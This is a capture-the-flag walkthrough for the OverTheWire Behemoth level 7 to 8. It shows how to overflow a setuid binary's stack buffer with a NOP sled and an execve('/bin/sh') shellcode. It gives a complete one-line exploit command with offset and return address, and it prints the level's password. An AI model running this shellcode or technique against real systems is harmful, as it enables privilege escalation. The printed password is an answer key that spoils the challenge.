# Behemoth Level 7 → 8

## Goal

`behemoth7` is another stack buffer overflow, but with a twist: the program does a check on your input before copying it — often looking for non-alphanumeric characters and rejecting the input if it's "suspicious." You still get to overflow the buffer, but your shellcode has to live **after** the return address (not before it), and the return address has to point at a big NOP sled that runs into the shellcode.

## Concepts you'll learn

- Placing shellcode **after** the saved return address instead of at the start of the buffer
- NOP sleds — a large run of `\x90` bytes so a slightly-off jump address still lands you in valid shellcode
- Finding the approximate location of your payload on the stack using `gdb`
- Passing a long payload via `argv[1]` instead of stdin (shells deliver argv cleanly to `strcpy`-style reads)

## Walkthrough

### 1. Explore

```bash
$ cd /behemoth
$ ls -l behemoth7
-r-sr-x--- 1 behemoth8 behemoth7 ... behemoth7

$ ./behemoth7 hello
(prints a usage hint or processes "hello")
```

Push something longer to confirm the overflow:

```bash
$ ./behemoth7 $(python -c 'print("A"*600)')
Segmentation fault
```

### 2. Find the offset to the return address

Same approach as [level 1 → 2](level01.md): generate a cyclic pattern, crash the binary, find where EIP landed, and compute the offset.

Axcheron reports the offset as **528**. Trust, but verify on your own system with `gdb` and a cyclic pattern.

### 3. Plan the payload layout

A straightforward layout that works well here:

```
[ 528 bytes of filler (e.g. 'A' or \x90) ][ return address (4 bytes) ][ 200+ bytes of NOPs ][ 24 bytes of shellcode ]
```

Key idea: the return address needs to point *into the NOP sled*, which lives **after** the return address on the stack. When the function returns, EIP lands in the NOPs, slides down them, and eventually hits the shellcode.

### 4. Find a valid return address

Stage the payload with a placeholder return address and crash it in `gdb`:

```bash
$ gdb -q ./behemoth7
(gdb) r $(python -c 'import sys; sys.stdout.buffer.write(b"A"*528 + b"BBBB" + b"\x90"*200 + b"<shellcode>")')
(gdb) x/200wx $esp
```

Look at the stack near where your `\x90\x90\x90\x90...` run begins. Pick any address that's *inside* the NOP sled (not at its edge — give yourself a few bytes of margin on either side). Axcheron used **`0xffffd7e0`**.

### 5. Fire the exploit

Using axcheron's values as an illustrative example:

```bash
$ /behemoth/behemoth7 $(python -c 'import sys; sys.stdout.buffer.write(b"A"*528 + b"\xe0\xd7\xff\xff" + b"\x90"*200 + b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80")')
```

Breakdown:

- `A*528` — fills the buffer all the way to EIP
- `\xe0\xd7\xff\xff` — little-endian `0xffffd7e0`, the return address pointing into the NOP sled
- `\x90*200` — NOP sled; landing anywhere in this range is fine
- `\x31\xc0\x50...` — standard 24-byte execve("/bin/sh") shellcode

If alignment is right, you get a shell as `behemoth8`:

```bash
$ whoami
behemoth8
$ cat /etc/behemoth_pass/behemoth8
pheewij7Ae
```

### 6. If it segfaults

- Your return address may miss the sled. Widen the NOP sled or aim further into its middle.
- ASLR (stack randomisation) may be on. If running the same payload gives a different crash address each time, the stack is moving — you'll need to either disable ASLR in `gdb` (`set disable-randomization on`) just to find the offset, then brute-force in a loop on the live binary, or use an infoleak trick.
- Shellcode may contain a forbidden byte if argv is filtered for specific values (NUL is always forbidden via argv since it terminates the string).

## The answer

The password for `behemoth8` is:

**`pheewij7Ae`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## A note on Behemoth ending here

`behemoth8` is the final user in the Behemoth wargame (there is no `behemoth9`). Logging in as `behemoth8` with this password is the finish line. OTW recommends moving on to [Utumno](../utumno/README.md) or [Maze](../maze/README.md) next for harder binary exploitation, or picking a sibling wargame like [Leviathan](../leviathan/README.md) or [Narnia](../narnia/README.md) if you want variety.

## Reference

- Official level page: <https://overthewire.org/wargames/behemoth/behemoth7.html>
